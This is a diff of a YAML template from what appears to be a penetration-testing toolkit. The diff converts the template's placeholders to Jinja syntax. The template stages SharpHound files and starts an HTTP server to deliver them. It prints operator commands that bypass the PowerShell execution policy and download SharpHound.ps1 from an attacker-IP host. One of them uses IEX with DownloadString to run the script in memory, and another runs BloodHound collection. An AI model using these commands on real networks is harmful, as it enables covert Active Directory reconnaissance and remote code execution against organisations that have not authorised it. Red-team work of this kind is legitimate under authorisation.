@@ -1,19 +1,22 @@
----
 metadata:
-  filename: "deliver-windows-sharphound.yaml"
-  tags: ["windows", "domain"]
-  created: "2025-03-29"
-  author: "Unknown"
-
-content: |
-  mkdir -p packstation/outbound; cp -n <%=$(esh variables/tools_dir)%>/bloodhound/* packstation/outbound; \
-  echo '================================================================'; \
-  echo '                      -----PowerShell-----                      '; \
-  echo 'Preparation (for Save on disk only): powershell -ep bypass'; \
-  echo 'Deliver, Save to disk & Import: iwr -uri http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/SharpHound.ps1 -Outfile <%=$(esh variables/delivery_path_windows)%>\SharpHound.ps1; Import-Module <%=$(esh variables/delivery_path_windows)%>\SharpHound.ps1'; \
-  echo 'Deliver & Inject to memory: IEX (New-Object System.Net.Webclient).DownloadString(\'http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/SharpHound.ps1\')'; \
-  echo 'To run: Invoke-BloodHound -CollectionMethod All -OutputDirectory <%=$(esh variables/delivery_path_windows)%>\ -OutputPrefix "audit"'; \
-  echo '================================================================'; \
-  echo '                         -----CMD-----                          '; \
-  echo '================================================================'; \
-   python <%=$(esh variables/templates_dir)%>/helper_scripts/startEnhancedHttpServer.py -p <%=$(esh variables/delivery_outbound_port)%> -d packstation/outbound
+  filename: deliver-windows-sharphound.yaml
+  tags:
+  - windows
+  - domain
+  created: '2025-03-29'
+  author: Unknown
+content: "mkdir -p packstation/outbound; cp -n {{ tools_dir }}/bloodhound/* packstation/outbound;\
+  \ \\\necho '================================================================'; \\\
+  \necho '                      -----PowerShell-----                      '; \\\n\
+  echo 'Preparation (for Save on disk only): powershell -ep bypass'; \\\necho 'Deliver,\
+  \ Save to disk & Import: iwr -uri http://{{ attacker_ip }}:{{ delivery_outbound_port\
+  \ }}/SharpHound.ps1 -Outfile {{ delivery_path_windows }}\\SharpHound.ps1; Import-Module\
+  \ {{ delivery_path_windows }}\\SharpHound.ps1'; \\\necho 'Deliver & Inject to memory:\
+  \ IEX (New-Object System.Net.Webclient).DownloadString(\\'http://{{ attacker_ip\
+  \ }}:{{ delivery_outbound_port }}/SharpHound.ps1\\')'; \\\necho 'To run: Invoke-BloodHound\
+  \ -CollectionMethod All -OutputDirectory {{ delivery_path_windows }}\\ -OutputPrefix\
+  \ \"audit\"'; \\\necho '================================================================';\
+  \ \\\necho '                         -----CMD-----                          '; \\\
+  \necho '================================================================'; \\\n\
+  \ python {{ templates_dir }}/helper_scripts/startEnhancedHttpServer.py -p {{ delivery_outbound_port\
+  \ }} -d packstation/outbound\n"
